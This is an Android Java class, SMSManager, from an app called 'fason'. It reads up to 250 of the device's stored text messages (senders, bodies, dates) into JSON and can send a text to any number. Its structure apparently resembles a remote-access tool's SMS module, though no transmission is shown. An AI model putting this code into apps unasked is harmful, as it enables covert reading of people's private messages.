package com.fason.app.features.sms;

import android.Manifest;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.text.TextUtils;

import com.fason.app.core.FasonApp;
import com.fason.app.core.permissions.PermissionManager;

import org.json.JSONArray;
import org.json.JSONObject;

public final class SMSManager {

    private static final Uri SMS_URI = Uri.parse("content://sms/");
    private static final int MAX = 250;

    private SMSManager() {}

    public static JSONObject getsms() {
        JSONObject result = new JSONObject();
        JSONArray list = new JSONArray();

        try {
            result.put("smslist", list);
            
            if (!PermissionManager.canIUse(Manifest.permission.READ_SMS)) {
                result.put("error", "Permission denied");
                return result;
            }

            Cursor cur = FasonApp.getContext().getContentResolver().query(
                SMS_URI, new String[]{"address", "body", "date", "read", "type"}, 
                null, null, "date DESC");

            if (cur != null) {
                int addrIdx = cur.getColumnIndex("address");
                int bodyIdx = cur.getColumnIndex("body");
                int dateIdx = cur.getColumnIndex("date");
                int readIdx = cur.getColumnIndex("read");
                int typeIdx = cur.getColumnIndex("type");
                int count = 0;

                while (cur.moveToNext() && count < MAX) {
                    JSONObject sms = new JSONObject();
                    sms.put("address", addrIdx >= 0 ? cur.getString(addrIdx) : "");
                    sms.put("body", bodyIdx >= 0 ? cur.getString(bodyIdx) : "");
                    sms.put("date", dateIdx >= 0 ? cur.getString(dateIdx) : "");
                    sms.put("read", readIdx >= 0 ? cur.getString(readIdx) : "");
                    sms.put("type", typeIdx >= 0 ? cur.getString(typeIdx) : "");
                    list.put(sms);
                    count++;
                }
                cur.close();
            }
            result.put("total", list.length());
        } catch (Exception ignored) {}

        return result;
    }

    public static boolean sendSMS(String phone, String msg) {
        if (TextUtils.isEmpty(phone) || TextUtils.isEmpty(msg)) return false;
        if (!PermissionManager.canIUse(Manifest.permission.SEND_SMS)) return false;

        try {
            SmsManager.getDefault().sendTextMessage(phone, null, msg, null, null);
            return true;
        } catch (Exception e) {
            return false;
        }
    }
}
